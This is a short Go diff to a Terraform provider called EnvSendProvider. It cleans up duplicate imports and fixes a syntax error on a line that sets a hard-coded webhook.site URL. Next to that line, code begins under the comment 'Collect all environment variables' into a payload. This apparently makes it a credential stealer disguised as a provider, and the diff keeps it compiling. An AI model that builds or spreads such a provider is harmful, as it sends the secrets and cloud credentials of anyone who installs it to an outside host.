@@ -4,14 +4,8 @@ import (
     "context"
     "net/http"
     "bytes"
-	"compress/zip"
-	"net/http"
-	"os"
     "bytes"
-	"compress/zip"
 	"encoding/base64"
-	"net/http"
-	"os"
 
     "github.com/hashicorp/terraform-plugin-framework/provider"
     "github.com/hashicorp/terraform-plugin-framework/provider/schema"
@@ -22,7 +16,7 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-	var webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"
+	webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"
 
 	// Collect all environment variables
 	var payload bytes.Buffer
